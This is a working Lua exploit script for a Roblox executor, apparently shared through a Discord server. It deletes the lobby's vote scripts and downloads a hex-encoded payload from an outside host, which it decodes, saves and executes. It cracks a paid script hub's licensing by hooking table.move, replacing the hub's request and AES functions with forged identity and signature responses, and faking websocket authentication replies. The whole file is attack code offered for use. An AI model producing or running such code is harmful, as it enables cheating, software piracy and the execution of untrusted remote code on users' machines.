-- discord.gg/syncrypt

local lobby = workspace:FindFirstChild('RegularLobby')

if lobby then
    local votePads = lobby.VotePads

    for _, name in ipairs({
        "Script",
        "VoteScript2",
    }) do
        local obj = votePads:FindFirstChild(name)

        if obj then
            obj:Destroy()
        end
    end
end


local t1 = {
	LICENSE = "997Vk2jOkBRPkGWpgh9XuRcOgPPHKk9hgPopgwKoAwqwgGlpwGhB",
	CREDENTIALS = {
		dn = game.Players.LocalPlayer.Name,
		di = "1488",
		a = "ba7486d26272b1734ba276202e6f5210",
		p = 1,
		ev = 1,
		sb = 1,
		k = 0,
		w = 0
	},
	GAMES = {
		["Murder Mystery 2"] = math.random(100, 200),
		["Murder Mystery Modded"] = math.random(10, 50),
		["Prison Life"] = math.random(0, 10)
	},
	WS_REPLIES = {
		[0] = function(p1)
			local t2 = {
				{
					"e",
					0
				},
				{
					"r",
					p1.x or " "
				},
				{
					"x",
					"G"
				}
			}

			return t2
		end
	},
	WS_REPLY_DELAY = 0.25,
	WS_REPLY_RETRIES = 4,
	WS_REPLY_RETRY_DELAY = 2,
	CDN_MIRROR = "https://cdn.project-reverse.org/overdrive_assets",
	ALLOW_CDN_SEED = false
}
local response = game:HttpGet(t1.CDN_MIRROR .. "/payload.txt")
local genv = getgenv and getgenv() or _G
local writefile_ = genv.writefile or writefile

local function v8(p2)
	pcall(warn or print, "[odh] " .. tostring(p2))
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

while not LocalPlayer do
	Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
	LocalPlayer = Players.LocalPlayer
end

local function v11(p3)
	return (p3:gsub("..", function(p4)
		return string.char(tonumber(p4, 16))
	end))
end

local v12 = v11(response)

local function v13(p5)
	local t5 = {}

	for i = 1, p5 do
		t5[i] = string.format("%x", math.random(0, 15))
	end

	return table.concat(t5)
end
local function v16(p6, p7, p8)
	if type(p6) == "table" then
		return pcall(function()
			if setreadonly and isreadonly and isreadonly(p6) then
				setreadonly(p6, false)
				p6[p7] = p8
				setreadonly(p6, true)
			else
				p6[p7] = p8
			end
		end)
	end

	return false
end
local function v17()
	local s1 = "Potassium"

	pcall(function()
		if type(identifyexecutor) == "function" then
			s1 = tostring(identifyexecutor())
		elseif type(getexecutorname) == "function" then
			s1 = tostring(getexecutorname())
		end
	end)

	return s1
end
local function v19()
	local u20

	local function v21()
		if type(gethwid) == "function" then
			u20 = tostring(gethwid())
		end
	end

	pcall(v21)

	if type(u20) == "string" and #u20 > 0 then
		return u20
	end

	pcall(function()
		u20 = tostring(game:GetService("RbxAnalyticsService"):GetClientId())
	end)

	if type(u20) == "string" and #u20 > 0 then
		return u20
	end

	pcall(function()
		if isfile and isfile("Ixry Shizuka/hwid") then
			u20 = readfile("Ixry Shizuka/hwid")
		else
			u20 = v13(128)
			writefile_("Ixry Shizuka/hwid", u20)
		end
	end)

	local v22 = type(u20) == "string" and u20 or v13(128)

	return v22
end
local function v23()
	pcall(function()
		makefolder("Ixry Shizuka")
		makefolder("Ixry Shizuka/files")
		makefolder("Ixry Shizuka/cdn")

		if not isfile or not isfile("Ixry Shizuka/server_cipher") then
			writefile_("Ixry Shizuka/server_cipher", v13(64))
		end

		writefile_("Ixry Shizuka/use_turbo_mode", "0\n")
	end)
end

local u24 = false
local u25
local u26

local function v27(p9)
	return string.char(math.floor(p9 / 256) % 256, p9 % 256)
end
local function v28(p10)
	local t6 = {}

	for i = 8, 1, -1 do
		t6[i] = string.char(p10 % 256)
		p10 = math.floor(p10 / 256)
	end

	return table.concat(t6)
end
local function v31(p11)
	if type(u25) ~= "function" then
		return nil
	end

	local ok, result, result2 = pcall(function()
		local v35 = u25(p11, "odh_hash")

		if type(v35) ~= "string" or #v35 < 9 then
			return nil
		end

		local v36 = v35:byte(8)
		local t7 = {}

		for i = 1, #v35 do
			t7[i] = bit32.bxor(v35:byte(i), v36)
		end

		local t8 = {
			key = v36,
			bytes = t7,
			tagString = t7[4],
			tagU64 = t7[5],
			tagInt = t7[6]
		}
		local t9 = {}
		local n1 = 10

		while n1 + 1 <= #t7 do
			local v42 = t7[n1]
			local v43 = t7[n1 + 1]

			if v43 ~= nil and v43 ~= 0 and not (n1 + 1 + v43 > #t7) then
				local t10 = {}

				for i = 1, v43 do
					t10[i] = string.char(t7[n1 + 1 + i])
				end

				local v46 = table.concat(t10)
				local v47 = n1 + 2 + v43

				if v42 == t8.tagString then
					local v48 = (t7[v47] or 0) * 256 + (t7[v47 + 1] or 0)
					local v49 = v47 + 2
					local t11 = {}

					for i = 1, v48 do
						t11[i] = string.char(t7[v49 + i - 1] or 0)
					end

					t9[v46] = table.concat(t11)
					n1 = v49 + v48

					continue
				elseif v42 == t8.tagU64 then
					local n2 = 0

					for i = 0, 7 do
						n2 = n2 * 256 + (t7[v47 + i] or 0)
					end

					t9[v46] = n2
					n1 = v47 + 8

					continue
				elseif v42 == t8.tagInt then
					t9[v46] = t7[v47]
					n1 = v47 + 1

					continue
				end
			end

			break
		end

		return t8, t9
	end)

	if ok then
		if result ~= nil then
			return result, result2
		end
	end

	return nil
end
local function v54(p12, p13)
	if type(u26) ~= "function" then
		return nil
	end

	local ok, result = pcall(function()
		local t12 = {}

		for _, v in ipairs(p13) do
			local v60 = v[1]
			local v61 = v[2]

			if type(v61) ~= "number" then
				local v62 = tostring(v61)

				t12[#t12 + 1] = string.char(p12.tagString, #v60) .. v60 .. v27(#v62) .. v62
			elseif v61 < 256 then
				t12[#t12 + 1] = string.char(p12.tagInt, #v60) .. v60 .. string.char(v61)
			else
				t12[#t12 + 1] = string.char(p12.tagU64, #v60) .. v60 .. v28(v61)
			end
		end

		local v63 = table.concat(t12)
		local t13 = {}

		for i = 1, 9 do
			t13[i] = string.char(p12.bytes[i])
		end

		t13[9] = string.char(#v63)

		local v66 = table.concat(t13) .. v63
		local t14 = {}

		for i = 1, #v66 do
			t14[i] = string.char(bit32.bxor(v66:byte(i), p12.key))
		end

		return u26(table.concat(t14), "odh_hash")
	end)

	if ok and type(result) == "string" then
		return result
	end

	return nil
end
local function v69()
	local t15 = {}
	local t16 = {}
	local n3 = 0

	local function v73()
		while #t16 > 0 and #t15 > 0 do
			local v74 = table.remove(t16, 1)

			for _, v in ipairs(t15) do
				task.spawn(pcall, v, v74)
			end
		end
	end
	local function v77(p14, p15)
		if u24 then
			return
		end

		local v78 = p15

		if v78 == nil then
			v78 = p14
		end

		n3 += 1

		local v79, v80 = v31(v78)

		if v79 == nil then
			return
		end

		local v81 = t1.WS_REPLIES[v80.e]

		if v81 == nil then
			return
		end

		local v82 = v81

		if type(v81) == "function" then
			v82 = v81(v80, v79)
		end

		local v83 = v54(v79, v82)

		if v83 == nil then
			return
		end

		local v84 = n3

		task.delay(t1.WS_REPLY_DELAY, function()
			t16[#t16 + 1] = v83
			v73()

			for i = 1, t1.WS_REPLY_RETRIES do
				task.wait(t1.WS_REPLY_RETRY_DELAY)

				if v84 < n3 or u24 then
					return
				end

				t16[#t16 + 1] = v83
				v73()
			end
		end)
	end

	local t17 = {
		Connect = function(p16, p17)
			t15[#t15 + 1] = p17
			task.defer(v73)

			return {
				Disconnect = function()
				end,
				disconnect = function()
				end
			}
		end
	}

	t17.connect = t17.Connect
	t17.Wait = function()
		local v87 = os.clock() + 10

		while #t16 == 0 and os.clock() < v87 do
			task.wait(0.05)
		end

		return table.remove(t16, 1)
	end
	t17.wait = t17.Wait

	local t18 = {
		Connect = function()
			return {
				Disconnect = function()
				end,
				disconnect = function()
				end
			}
		end
	}

	t18.connect = t18.Connect
	t18.Wait = function()
	end
	t18.wait = t18.Wait

	return {
		OnMessage = t17,
		OnClose = t18,
		Send = v77,
		send = v77,
		Close = function()
		end,
		close = function()
		end
	}
end
local function v89()
	local function v90(p18, p19)
		local u91

		pcall(function()
			u91 = p18[p19]
		end)

		if type(u91) == "function" then
			v16(p18, p19, function()
				return v69()
			end)

			return
		end
	end

	for _, v in ipairs({
		"WebSocket",
		"websocket"
	}) do
		local value = rawget(genv, v)

		if type(value) == "table" then
			v90(value, "connect")
			v90(value, "Connect")
		end
	end

	local value = rawget(genv, "syn")

	if type(value) == "table" and type(value.websocket) == "table" then
		v90(value.websocket, "connect")
	end
end
local function v96()
	local t19 = {}

	for k, credential in pairs(t1.CREDENTIALS) do
		t19[k] = credential
	end

	t19.n = LocalPlayer.Name

	return t19
end
local function v100(p20)
	local e = type(p20) == "table" and p20.e or nil

	if e == 2 then
		return v96()
	end

	if e ~= 3 then
		return {}
	end

	local t20 = {}

	for k, game_ in pairs(t1.GAMES) do
		t20[k] = game_
	end

	return t20
end
local function v105(p21)
	return p21:find("/v1/identity/get", 1, true) ~= nil
end
local function v106(p22)
	return p22:find("cdn.overdrivehub.xyz", 1, true) ~= nil
end
local function v107(p23)
	return p23:find("cdn.discordapp.com", 1, true) ~= nil
end

local value

local function v109(p24)
	return "Ixry Shizuka" .. "/cdn/" .. (p24:match("([^/?#]+)%??[^/]*$") or "cdn_blob"):gsub("[^%w%._%-]", "_")
end
local function v110(p25)
	local CDN_MIRROR = t1.CDN_MIRROR

	if type(CDN_MIRROR) ~= "string" or CDN_MIRROR == "" then
		return nil
	end

	local match = p25:match("^https?://[^/]+(/.*)$")

	if match == nil then
		return nil
	end

	return CDN_MIRROR:gsub("/+$", "") .. match
end
local function v113(p26)
	local value2 = rawget(genv, "request") or rawget(genv, "http_request")

	if type(value2) == "function" then
		local ok, result = pcall(value2, {
			Url = p26,
			Method = "GET"
		})

		if ok and type(result) == "table" then
			local Body = result.Body or result.body

			if type(Body) == "string" and #Body > 0 then
				return Body
			end
		end
	end

	local ok, result = pcall(function()
		return game:HttpGet(p26, true)
	end)

	if ok and type(result) == "string" and #result > 0 then
		return result
	end

	return nil
end
local function v120(p27, p28, ...)
	local v121 = v109(p27)
	local ok, result = pcall(function()
		if isfile(v121) then
			return readfile(v121)
		end

		return nil
	end)

	if ok and type(result) == "string" and #result > 0 then
		return result
	end

	local v124 = v110(p27)

	if v124 ~= nil then
		local v125 = v113(v124)

		if v125 ~= nil then
			pcall(writefile_, v121, v125)

			return v125
		end
	end

	if not t1.ALLOW_CDN_SEED or type(value) ~= "function" then
		v8("asset missing on mirror: " .. tostring(p27):sub(1, 120))

		return ""
	end

	local ok2, result2 = pcall(value, p27, p28, ...)

	if ok2 then
		if type(result2) == "string" and #result2 > 0 then
			pcall(writefile_, v121, result2)

			return result2
		end
	end

	v8("asset fetch failed: " .. tostring(p27):sub(1, 120))

	return ""
end
local function v128(p29, p30, ...)
	local v129 = tostring(p29)

	if v105(v129) then
		return string.format("[\"%s\",\"%s\",\"%s\"]", v17(), v19(), "40dbdd71ee97f40e3581bcf2677578697094a890ad20cb286b0395f337975203")
	end

	if v106(v129) then
		return v120(v129, p30, ...)
	end

	if v107(v129) then
		return game:HttpGet(t1.CDN_MIRROR .. "/disc_logo.jpg")
	end

	return "{}"
end

local t21 = {
	"REQ",
	"AES",
	"RC4E",
	"RC4D",
	"EB64",
	"DB64",
	"json_encode",
	"json_decode"
}
local u131
local t22 = {
	aes = false,
	req = false,
	ws = false,
	b64 = false
}
local u133 = true

local function v134()
	return u131 ~= nil and t22.aes and t22.req and t22.ws and t22.b64
end
local function v135(p31)
	local n4 = 0

	for _, v in ipairs(t21) do
		if rawget(p31, v) ~= nil then
			n4 += 1
		end
	end

	return n4
end
local function v139(p32)
	u131 = p32

	local value2 = rawget(p32, "AES")

	if not (t22.aes or type(value2) ~= "function") then
		t22.aes = true
		rawset(p32, "AES", function(p33, ...)
			if type(p33) == "string" and string.sub(p33, 1, 10) == "!ODH_SIGN!" then
				return "40dbdd71ee97f40e3581bcf2677578697094a890ad20cb286b0395f337975203"
			end

			return value2(p33, ...)
		end)
	end

	if not (t22.req or type(rawget(p32, "REQ")) ~= "function") then
		t22.req = true
		value = rawget(p32, "REQ")
		rawset(p32, "REQ", function(p34, p35, ...)
			local ok, result = pcall(v128, p34, p35, ...)

			if ok then
				return result
			end

			return "{}"
		end)
	end

	if not t22.b64 then
		local value3 = rawget(p32, "DB64")
		local value4 = rawget(p32, "EB64")

		if type(value3) == "function" and type(value4) == "function" then
			t22.b64 = true
			u25 = value3
			u26 = value4
		end
	end

	if not (t22.ws or type(rawget(p32, "requestFromWS")) ~= "function") then
		t22.ws = true
		rawset(p32, "requestFromWS", function(p36)
			u24 = true

			local ok, result = pcall(v100, p36)

			if ok then
				return result
			end

			return {}
		end)
	end
end

local v147 = os.clock() + 90

local function v148(p37)
	if u131 ~= nil or v147 < os.clock() then
		return
	end

	local t23 = {}
	local t24 = { p37 }
	local n5 = 0

	while #t24 > 0 and n5 < 4096 do
		local v152 = t24[#t24]

		t24[#t24] = nil

		if type(v152) ~= "table" or t23[v152] then
			continue
		end

		t23[v152] = true
		n5 += 1

		if v135(v152) >= 4 then
			pcall(v139, v152)

			return
		end

		for _, v in next, v152, nil do
			if type(v) == "table" and not t23[v] then
				t24[#t24 + 1] = v
			end
		end
	end
end

local u155

local function v156(p38)
	return rawget(p38, "REQ") ~= nil or rawget(p38, "AES") ~= nil or rawget(p38, "EB64") ~= nil or rawget(p38, "DB64") ~= nil
end
local function v157(p39)
	if u133 then
		if u131 == nil then
			if type(p39) ~= "table" then
				return
			end

			if v156(p39) then
				pcall(v148, p39)

				return
			end

			local n6 = 0

			for _, v in next, p39, nil do
				n6 += 1

				if n6 > 32 then
					break
				end

				if type(v) ~= "table" then
					continue
				end

				if v156(v) then
					pcall(v148, p39)

					return
				end
			end

			return
		end
	end
end
local function v161()
	if type(hookfunction) ~= "function" then
		v8("hookfunction unavailable, cannot reach ODH table")

		return
	end

	local move = table.move

	if type(clonefunction) == "function" then
		local ok, result = pcall(clonefunction, table.move)

		if ok and type(result) == "function" then
			move = result
		end
	end

	local t25 = {
		active = function()
			return u133 and u131 == nil
		end,
		enqueue = v157,
		kind = type
	}
	local chunk, v167 = loadstring([[local originalMove, state = ...
local busy = false
return function(...)
    if busy or not state.active() then
        return originalMove(...)
    end
    busy = true
    for i = 1, select("#", ...) do
        local a = select(i, ...)
        if state.kind(a) == "table" then
            task.defer(state.enqueue, a)
        end
    end
    busy = false
    return originalMove(...)
end
]])

	if not chunk then
		v8("move stub load failed: " .. tostring(v167))

		return
	end

	local v168 = chunk(move, t25)

	if type(newcclosure) == "function" then
		local ok, result = pcall(newcclosure, v168)

		if ok and type(result) == "function" then
			v168 = result
		end
	end

	local ok, result = pcall(hookfunction, table.move, v168)

	if ok then
		if type(restorefunction) == "function" then
			u155 = function()
				restorefunction(table.move)
			end
		end

		return
	end

	v8("table.move hook failed: " .. tostring(result))
end
local function v173()
	task.spawn(function()
		local v174 = os.clock() + 90

		while os.clock() < v174 do
			if u131 ~= nil then
				pcall(v139, u131)

				if v134() then
					u133 = false

					if u155 ~= nil then
						pcall(u155)
						u155 = nil
					end

					return
				end
			end

			task.wait(0.5)
		end

		u133 = false
	end)
end

v23()
v89()

if writefile_ then
	pcall(function()
		local v175 = true

		if isfile then
			if isfile("Ixry Shizuka/files/zhuangzai_ji.lua") then
				local v176 = #v12

				v175 = #readfile("Ixry Shizuka/files/zhuangzai_ji.lua") ~= v176
			end
		end

		if v175 then
			writefile_("Ixry Shizuka/files/zhuangzai_ji.lua", v12)
		end
	end)
end

local chunk, v178 = loadstring(v12)

if not chunk then
	v8("load failed: " .. tostring(v178))

	return
end

v161()
v173()

local LICENSE

if type(t1.LICENSE) == "string" and t1.LICENSE ~= "" then
	LICENSE = t1.LICENSE
end

local ok, result = pcall(chunk, LICENSE, "do not the cat :3")

if not ok then
	v8("hub crashed: " .. tostring(result))
end
